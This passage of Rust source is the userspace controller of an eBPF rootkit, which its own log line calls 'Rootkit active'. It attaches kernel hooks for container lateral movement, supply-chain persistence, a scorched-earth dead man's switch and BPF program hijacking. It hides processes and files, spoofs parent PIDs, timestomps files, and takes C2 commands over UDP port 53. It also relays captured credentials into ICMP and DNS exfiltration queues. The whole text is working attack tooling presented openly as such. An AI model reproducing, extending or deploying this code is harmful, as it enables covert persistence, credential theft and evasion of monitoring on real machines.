            .context("shadow_phantom_ingress not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, XdpFlags::default())?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_phantom_state")
            .context("shadow_phantom_state not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("tcp_rcv_state_process", 0)?;

        let prog: &mut SchedClassifier = bpf
            .program_mut("shadow_phantom_egress")
            .context("shadow_phantom_egress not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!("✓ Features 55-57: Phantom Network Stack attached");
    }

    // ── Features 58-60: Container Lateral Movement ──
    if cli.enable_container_lateral {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_cgroup_bpf_attach")
            .context("shadow_cgroup_bpf_attach not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("cgroup_bpf_prog_attach", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_switch_namespaces")
            .context("shadow_switch_namespaces not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("switch_task_namespaces", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_commit_creds_ns")
            .context("shadow_commit_creds_ns not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("commit_creds", 0)?;
        info!("✓ Features 58-60: Container Lateral Movement attached");
    }

    // ── Features 61-63: DMA Covert Channel ──
    if cli.enable_dma_covert {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_iommu_map")
            .context("shadow_iommu_map not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("iommu_map", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_pci_config_read")
            .context("shadow_pci_config_read not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("pci_read_config_dword", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_ndo_start_xmit")
            .context("shadow_ndo_start_xmit not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("ndo_start_xmit", 0)?;
        info!("✓ Features 61-63: DMA Covert Channel attached");
    }

    // ── Features 64-66: Behavioral AI Camouflage ──
    if cli.enable_behavioral_ai {
        let prog: &mut TracePoint = bpf
            .program_mut("shadow_syscall_profile")
            .context("shadow_syscall_profile not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("raw_syscalls", "sys_enter")?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_activity_throttle")
            .context("shadow_activity_throttle not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("__schedule", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_norm_avoidance")
            .context("shadow_norm_avoidance not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("__schedule", 0)?;
        info!("✓ Features 64-66: Behavioral AI Camouflage attached");
    }

    // ── Features 67-69: Supply Chain Persistence ──
    if cli.enable_supply_chain {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_execve_supply")
            .context("shadow_execve_supply not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("do_execveat_common", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_vfs_read_supply")
            .context("shadow_vfs_read_supply not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("vfs_read", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_integrity_bypass")
            .context("shadow_integrity_bypass not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("security_file_open", 0)?;
        info!("✓ Features 67-69: Supply Chain Persistence attached");
    }

    // ── Features 70-72: Dead Man's Switch ──
    if cli.enable_deadman_switch {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_udp_heartbeat")
            .context("shadow_udp_heartbeat not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("udp_rcv", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_deadman_check")
            .context("shadow_deadman_check not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("hrtimer_interrupt", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_scorched_earth")
            .context("shadow_scorched_earth not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("vfs_unlink", 0)?;
        info!("✓ Features 70-72: Dead Man's Switch attached");
    }

    // ── Features 73-75: BPF Parasitism ──
    if cli.enable_bpf_parasitism {
        let prog: &mut TracePoint = bpf
            .program_mut("shadow_bpf_prog_scan")
            .context("shadow_bpf_prog_scan not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("syscalls", "sys_enter_bpf")?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_tailcall_inject")
            .context("shadow_tailcall_inject not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("bpf_prog_array_copy", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_prog_array_hijack")
            .context("shadow_prog_array_hijack not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("bpf_map_update_elem", 0)?;
        info!("✓ Features 73-75: BPF Parasitism attached");
    }

    // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
    if cli.enable_bpf_cloak {
        let prog_ids: Vec<u32> = bpf
            .programs()
            .filter_map(|(_name, prog)| prog.info().ok().map(|info| info.id()))
            .collect();
        let mut own_prog_ids: HashMap<_, u32, u8> = HashMap::try_from(
            bpf.map_mut("OWN_PROG_IDS")
                .context("OWN_PROG_IDS map not found")?,
        )?;
        for id in prog_ids {
            own_prog_ids.insert(id, 1u8, 0)?;
        }
        info!("✓ OWN_PROG_IDS populated for cloaking");
    }

    // Apply CLI configurations
    if let Some(pid) = cli.hide_pid {
        let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(
            bpf.map_mut("HIDDEN_PIDS")
                .context("HIDDEN_PIDS not found")?,
        )?;
        hidden_pids.insert(pid, 1u8, 0)?;
        info!("✓ Hiding PID: {}", pid);
    }

    if let Some(inode) = cli.obfuscate_inode {
        let mut obfuscate_inodes: HashMap<_, u64, u8> = HashMap::try_from(
            bpf.map_mut("OBFUSCATE_INODES")
                .context("OBFUSCATE_INODES not found")?,
        )?;
        obfuscate_inodes.insert(inode, 1u8, 0)?;
        info!("✓ Obfuscating inode: {}", inode);
    }

    if let Some(tty) = cli.monitor_tty {
        if let Some((major, minor)) = parse_tty_device(&tty) {
            let dev_key = ((major as u64) << 32) | (minor as u64);
            let mut monitored_ttys: HashMap<_, u64, u8> = HashMap::try_from(
                bpf.map_mut("MONITORED_TTYS")
                    .context("MONITORED_TTYS not found")?,
            )?;
            monitored_ttys.insert(dev_key, 1u8, 0)?;
            info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
        } else {
            warn!("⚠ Invalid TTY format: {}", tty);
        }
    }

    if let Some(spoof) = cli.spoof_ppid {
        if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
            let mut spoofed_ppids: HashMap<_, u32, u32> = HashMap::try_from(
                bpf.map_mut("SPOOFED_PPIDS")
                    .context("SPOOFED_PPIDS not found")?,
            )?;
            spoofed_ppids.insert(pid, fake_ppid, 0)?;
            info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
        } else {
            warn!("⚠ Invalid spoof format: {}", spoof);
        }
    }

    if let Some(ts) = cli.timestomp {
        if let Some((inode, entry)) = parse_timestomp(&ts) {
            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> = HashMap::try_from(
                bpf.map_mut("TIMESTOMP_INODES")
                    .context("TIMESTOMP_INODES not found")?,
            )?;
            timestomp_inodes.insert(inode, entry, 0)?;
            info!("✓ Timestomping inode: {}", inode);
        } else {
            warn!("⚠ Invalid timestomp format: {}", ts);
        }
    }

    // Extract maps for C2 command dispatch before moving bpf
    let hidden_pids_map = bpf
        .take_map("HIDDEN_PIDS")
        .context("HIDDEN_PIDS not found")?;
    let obfuscate_inodes_map = bpf
        .take_map("OBFUSCATE_INODES")
        .context("OBFUSCATE_INODES not found")?;

    let c2_maps = Arc::new(C2Maps {
        hidden_pids: Mutex::new(HashMap::try_from(hidden_pids_map)?),
        obfuscate_inodes: Mutex::new(HashMap::try_from(obfuscate_inodes_map)?),
    });

    let (kill_tx, mut kill_rx) = watch::channel(false);

    // Extract ICMP exfil queue map if enabled
    let icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>> =
        if cli.enable_icmp_exfil && cli.enable_cred_relay {
            bpf.take_map("ICMP_EXFIL_QUEUE")
                .and_then(|m| HashMap::try_from(m).ok())
                .map(|m| Arc::new(Mutex::new(m)))
        } else {
            None
        };

    // Extract DNS exfil queue map for relay if enabled
    let dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>> =
        if cli.enable_cred_relay && !cli.enable_icmp_exfil {
            bpf.take_map("DNS_EXFIL_QUEUE")
                .and_then(|m| HashMap::try_from(m).ok())
                .map(|m| Arc::new(Mutex::new(m)))
        } else {
            None
        };

    // Start event monitoring with C2 dispatch
    tokio::spawn(monitor_events(
        bpf,
        Arc::clone(&c2_maps),
        kill_tx,
        icmp_queue,
        dns_queue,
        cli.enable_cred_relay,
    ));

    info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
    info!("📡 Listening for C2 commands on UDP port 53...");

    tokio::select! {
        _ = signal::ctrl_c() => {
            info!("🛑 Shutting down (Ctrl+C)...");
        }
        _ = async { while !*kill_rx.borrow_and_update() { kill_rx.changed().await.ok(); } } => {
            info!("🛑 Kill switch activated via C2. Shutting down...");
        }
    }

    Ok(())
}

fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
    let pin_path = Path::new(BPF_PIN_PATH);
    if !pin_path.exists() {
        fs::create_dir_all(pin_path)?;
    }

    for (name, map) in bpf.maps_mut() {
        let map_path = pin_path.join(name);
        if let Err(e) = map.pin(&map_path) {
            warn!("Failed to pin map {}: {}", name, e);
        }
    }

    Ok(())
}

async fn monitor_events(
    mut bpf: Ebpf,
    c2_maps: Arc<C2Maps>,
    kill_tx: watch::Sender<bool>,
    icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
    dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
    cred_relay: bool,
) {
    let events_map = match bpf.take_map("EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get EVENTS map");
            return;
        }
    };
    let events_ring = match RingBuf::try_from(events_map) {
        Ok(rb) => rb,
        Err(e) => {
            error!("Failed to create EVENTS ring buffer: {}", e);
            return;
        }
    };

    let cred_map = match bpf.take_map("CRED_EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get CRED_EVENTS map");
            return;
        }
    };
    let cred_ring = match RingBuf::try_from(cred_map) {
        Ok(rb) => rb,
        Err(e) => {
            error!("Failed to create CRED_EVENTS ring buffer: {}", e);
            return;
        }
    };

    info!("Event monitoring started (ring buffer mode)");

    let dns_seq = Arc::new(AtomicU32::new(0));

    let mut events_fd = match AsyncFd::new(events_ring) {
        Ok(fd) => fd,
        Err(e) => {
            error!("Failed to create AsyncFd for EVENTS: {}", e);
            return;
        }
    };

    let mut cred_fd = match AsyncFd::new(cred_ring) {
        Ok(fd) => fd,
        Err(e) => {
            error!("Failed to create AsyncFd for CRED_EVENTS: {}", e);
            return;
        }
    };

    tokio::spawn(async move {
        loop {
            let mut guard = match events_fd.readable_mut().await {
                Ok(g) => g,
                Err(e) => {
                    error!("EVENTS readable error: {}", e);
                    return;
                }
            };
            let rb = guard.get_inner_mut();
            while let Some(item) = rb.next() {
                if item.len() >= std::mem::size_of::<EventHeader>() {
                    let event =
                        unsafe { std::ptr::read_unaligned(item.as_ptr() as *const EventHeader) };
                    if event.event_type == EVENT_PACKET_INTERCEPTED {
                        let cmd_type = event.pid;
                        let arg = event.context;
                        dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
                    } else {
                        log_event(&event);
                    }
                }
            }
            guard.clear_ready();
        }
    });

    tokio::spawn(async move {
        loop {
            let mut guard = match cred_fd.readable_mut().await {
                Ok(g) => g,
                Err(e) => {
                    error!("CRED_EVENTS readable error: {}", e);
                    return;
                }
            };
            let rb = guard.get_inner_mut();
            while let Some(item) = rb.next() {
                if item.len() >= std::mem::size_of::<CredentialCapture>() {
                    let capture = unsafe {
                        std::ptr::read_unaligned(item.as_ptr() as *const CredentialCapture)
                    };
                    log_credential_capture(&capture);
                    if cred_relay {
                        relay_credential_to_icmp(&capture, &icmp_queue);
                        relay_credential_to_dns(&capture, &dns_queue, &dns_seq);
                    }
                }
            }
            guard.clear_ready();
        }
    });
}

fn dispatch_c2_command(cmd_type: u32, arg: u64, c2_maps: &C2Maps, kill_tx: &watch::Sender<bool>) {
    match cmd_type {
        1 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.insert(pid, 1u8, 0) {
                    Ok(_) => info!("C2: hide_pid {}", pid),
                    Err(e) => error!("C2: failed to hide PID {}: {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        2 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.remove(&pid) {
                    Ok(_) => info!("C2: unhide_pid {}", pid),
                    Err(e) => warn!("C2: unhide PID {} (not found or error): {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        3 => match c2_maps.obfuscate_inodes.lock() {
            Ok(mut map) => match map.insert(arg, 1u8, 0) {
                Ok(_) => info!("C2: obfuscate_file inode={}", arg),
                Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
            },
            Err(e) => error!("C2: lock error: {}", e),
        },
        4 => {
            debug!("C2: exfil request target={}", arg);
        }
        5 => {
            warn!("C2: kill_switch received, initiating shutdown");
            let _ = kill_tx.send(true);
        }
        _ => {
            warn!("C2: unknown command type={}, arg={}", cmd_type, arg);
        }
    }
}

fn log_event(event: &EventHeader) {
    match event.event_type {
        EVENT_PROC_HIDDEN => {
            debug!("Process hidden: PID={}", event.pid);
        }
        EVENT_FILE_OBFUSCATED => {
            debug!(
                "File obfuscated: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_LOG_TAMPERED => {
            debug!("Log tampered: PID={}, bytes={}", event.pid, event.context);
        }
        EVENT_ANCESTRY_SPOOFED => {
            debug!(
                "Ancestry spoofed: PID={}, fake_ppid={}",
                event.pid, event.context
            );
        }
        EVENT_DNS_EXFIL => {
            debug!("DNS exfiltration: seq={}", event.context);
        }
        EVENT_KALLSYMS_HIDDEN => {
            debug!(
                "Kallsyms hidden: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_ANTI_DETACH => {
            debug!(
                "Detach attempt blocked: PID={}, cmd={}",
                event.pid, event.context
            );
        }
        EVENT_TIMESTOMPED => {
            debug!(
                "Timestamp spoofed: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_C2_AUTH_FAILED => {
            warn!("C2 authentication failed: encrypted={}", event.context);
        }
        EVENT_TELEMETRY_MUTED => {
            debug!("Telemetry muted: PID={}", event.pid);
        }
        EVENT_NETNS_HIDDEN => {
            info!(
                "Netns hidden: PID={}, netns_ino={}",
                event.pid, event.context
            );
        }
        EVENT_BPF_CLOAKED => {
            debug!(
                "BPF program cloaked: PID={}, prog_id={}",
                event.pid, event.context
            );
        }
        EVENT_MODULE_MASQUERADE => {
            debug!(
                "Module masquerade: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_MEMFD_STAGED => {
            info!(
                "Memfd payload staged: PID={}, fd={}",
                event.pid, event.context
            );
        }
        EVENT_SYSLOG_STRIPPED => {
            debug!(
                "Syslog stripped: PID={}, bytes={}",
                event.pid, event.context
            );
        }
        EVENT_BYTECODE_WIPED => {
            warn!("Bytecode wipe confirmed: PID={}", event.pid);
        }
        EVENT_ICMP_EXFIL => {
            debug!("ICMP exfil sent: seq={}", event.context);
        }
        EVENT_SOCKET_CLONED => {
            debug!("Socket cloned: PID={}, cookie={}", event.pid, event.context);
        }
        EVENT_CRED_RELAYED => {
            info!(
                "Credential relayed: PID={}, bytes={}",
                event.pid, event.context
            );
        }
        EVENT_CONTAINER_PROBE => {
            info!(
                "Container probe: PID={}, ns_ino={}",
                event.pid, event.context
            );
        }
        EVENT_KPROBE_DETECTED => {
            warn!(
                "Kprobe detected on our hook: PID={}, addr=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_TAIL_CALL_CHAIN => {
            debug!(
                "Tail-call chain executed: PID={}, stage={}",
                event.pid, event.context
            );
        }
        EVENT_FTRACE_BLINDED => {
            info!(
                "Ftrace/perf blinded: PID={}, target=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_BPF_ITER_ABUSED => {
            info!(
                "BPF iterator filtered: PID={}, iter_id={}",
                event.pid, event.context
            );
        }
        EVENT_VDSO_HOOKED => {
            info!(
                "VDSO page mapped: PID={}, addr=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_SHM_COVERT_MSG => {
            debug!(
                "SHM covert msg: PID={}, shm_id={}",
                event.pid, event.context
            );
        }
        EVENT_UFFD_INJECTION => {
            info!(
                "UFFD injection: PID={}, fault_addr=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_COREDUMP_SUPPRESSED => {
            warn!(
                "Core dump suppressed: PID={}, signal={}",
                event.pid, event.context
            );
        }
        EVENT_ISN_COVERT => {
            debug!(
                "ISN covert channel: PID={}, bytes={}",
                event.pid, event.context
            );
        }
        EVENT_IPV6_EXT_ABUSE => {
            debug!(
                "IPv6 ext header injected: PID={}, len={}",
                event.pid, event.context
            );
        }
        EVENT_ARP_POISONED => {
            info!("ARP poisoned: target_ip=0x{:08x}", event.context as u32);
        }
        EVENT_PORT_KNOCK_AUTH => {
            warn!(
                "Port knock authenticated: src_ip=0x{:08x}",
                event.context as u32
            );
        }
        EVENT_BGP_HIJACK => {
            warn!(
                "BGP prefix announced: prefix=0x{:08x}",
                event.context as u32
            );
        }
        EVENT_DR_BREAKPOINT => {
            warn!(
                "HW breakpoint deflected: PID={}, addr=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_PMC_COVERT => {
            debug!("PMC covert data: PID={}, val={}", event.pid, event.context);
        }
        EVENT_TSC_SIDECHAN => {
            warn!(
                "TSC anomaly detected: PID={}, delta_ns={}",
                event.pid, event.context
            );
        }
        EVENT_AUDIT_KILLED => {
            warn!(
                "Audit msg suppressed: PID={}, msg_type={}",
                event.pid, event.context
            );
        }
        EVENT_INODE_SLACK_HIDE => {
            debug!(
                "Slack-space write: PID={}, ino={}",
                event.pid, event.context
            );
        }
        EVENT_JOURNAL_MANIPULATED => {
            info!(
                "Journal manipulated: PID={}, dev_ino={}",
                event.pid, event.context
            );
        }
        EVENT_PROC_DEEP_SPOOF => {
            info!(
                "/proc spoofed: PID={}, target_pid={}",
                event.pid, event.context
            );
        }
        EVENT_INITRAMFS_IMPLANT => {
            warn!(
                "Initramfs implant: PID={}, mod_ptr=0x{:x}",
                event.pid, event.context
            );
        }
        EVENT_MODSIGN_BYPASS => {
            warn!("Module sig check bypassed: PID={}", event.pid);
        }
        EVENT_BPF_LINK_PINNED => {
            info!(
                "BPF pin access: PID={}, path_ptr=0x{:x}",
                event.pid, event.context
            );
        }
        _ => {
            debug!("Unknown event: type={}", event.event_type);
        }
    }
}

static ICMP_EXFIL_SEQ: AtomicU32 = AtomicU32::new(0);

fn log_credential_capture(capture: &CredentialCapture) {
    let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
    info!(
        "Credential captured: PID={}, FD={}, data={:?}",
        capture.pid, capture.fd, data_str
    );
}

fn relay_credential_to_icmp(capture: &CredentialCapture, icmp_queue: &IcmpExfilMap) {
    let queue = match icmp_queue {
        Some(q) => q,
        None => return,
    };
    let seq = ICMP_EXFIL_SEQ.fetch_add(1, Ordering::Relaxed);
    let mut payload = IcmpExfilPayload {
        seq,
        data_len: capture.data_len.min(56),
        data: [0u8; 56],
    };
    let len = payload.data_len as usize;
    payload.data[..len].copy_from_slice(&capture.data[..len]);
    if let Ok(mut map) = queue.lock() {
        let _ = map.insert(seq, payload, 0);
    }
    debug!("Credential relayed via ICMP: seq={}, bytes={}", seq, len);
}

fn relay_credential_to_dns(
    capture: &CredentialCapture,
    dns_queue: &DnsExfilMap,
    seq_counter: &AtomicU32,
) {
    let queue = match dns_queue {
        Some(q) => q,
        None => return,
    };
    let seq = seq_counter.fetch_add(1, Ordering::Relaxed);
    let mut chunk = DnsExfilChunk {
        seq,
        data_len: capture.data_len.min(64),
        data: [0u8; 64],
    };
    let len = chunk.data_len as usize;
    chunk.data[..len].copy_from_slice(&capture.data[..len]);
    if let Ok(mut map) = queue.lock() {
        let _ = map.insert(seq, chunk, 0);
    }
    debug!("Credential relayed via DNS: seq={}, bytes={}", seq, len);
}
